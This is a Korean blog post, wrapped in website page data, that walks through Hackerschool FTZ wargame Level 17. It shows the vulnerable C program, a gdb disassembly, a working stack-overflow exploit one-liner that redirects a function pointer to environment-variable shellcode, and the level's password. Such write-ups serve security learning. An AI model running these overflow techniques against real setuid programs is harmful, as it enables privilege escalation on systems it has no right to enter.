{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221007/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>이번 문제는 사실 정말 설명이 필요 없을정도로 Level 16과 비슷하다…</p>\n<h3>1. Level 17</h3>\n<p>소스코드부터 확인해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n\r\nvoid printit() {\r\n\r\n  printf(\"Hello there!\\n\");\r\n\r\n}\r\n\r\nmain()\r\n\r\n{ int crap;\r\n\r\n  void (*call)()=printit;\r\n\r\n  char buf[20];\r\n\r\n  fgets(buf,48,stdin);\r\n\r\n  setreuid(3098,3098);\r\n\r\n  call();\r\n}</code></pre></div>\n<p>크게 어려울 것 없는 코드다. 다만 이번엔 printit함수만 존재한다! 그렇다고 RET까지 가기에는 입력받는 범위가 모자라다.</p>\n<p>그럼 단순히 Shell 코드 환경변수 하나 만들어서 그 주소를 printit에 대입하면 될 것이다. 환경변수를 만들고 주소까지 확인하는 법은 내 블로그 FTZ Level12에 자세히 나와있다!</p>\n<p>환경변수를 만들고 주소까지 확인해보니 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0xbffffc18</code></pre></div>\n<p>값이 나왔다. gdb로 포인터와 배열 사이의 거리를 재보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x080484a8 &lt;main+0>:    push   ebp\r\n0x080484a9 &lt;main+1>:    mov    ebp,esp\r\n0x080484ab &lt;main+3>:    sub    esp,0x38\r\n0x080484ae &lt;main+6>:    mov    DWORD PTR [ebp-16],0x8048490\r\n0x080484b5 &lt;main+13>:   sub    esp,0x4\r\n0x080484b8 &lt;main+16>:   push   ds:0x804967c\r\n0x080484be &lt;main+22>:   push   0x30\r\n0x080484c0 &lt;main+24>:   lea    eax,[ebp-56]\r\n0x080484c3 &lt;main+27>:   push   eax\r\n0x080484c4 &lt;main+28>:   call   0x8048350 &lt;fgets>\r\n0x080484c9 &lt;main+33>:   add    esp,0x10\r\n0x080484cc &lt;main+36>:   sub    esp,0x8\r\n0x080484cf &lt;main+39>:   push   0xc1a\r\n0x080484d4 &lt;main+44>:   push   0xc1a\r\n0x080484d9 &lt;main+49>:   call   0x8048380 &lt;setreuid>\r\n0x080484de &lt;main+54>:   add    esp,0x10\r\n0x080484e1 &lt;main+57>:   mov    eax,DWORD PTR [ebp-16]\r\n0x080484e4 &lt;main+60>:   call   eax\r\n0x080484e6 &lt;main+62>:   leave\r\n0x080484e7 &lt;main+63>:   ret\r\n0x080484e8 &lt;main+64>:   nop\r\n0x080484e9 &lt;main+65>:   nop</code></pre></div>\n<p>예상했지만, 저번 문제와 똑같다(…)</p>\n<p>그냥 저번 문제의 코드에서 주소만 쉘코드 주소로 바꿔서 넣어보니 문제가 풀린다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">(python -c 'print \"A\"*40+\"\\x18\\xfc\\xff\\xbf\"'; cat) | ./attackme</code></pre></div>\n<p>비밀번호 : why did you do it</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"해커스쿨 FTZ 레벨 17","summary":"","date":"2022.10.07.","before":"2022.10.06.","after":"2022.10.08.","categories":["KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221007/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}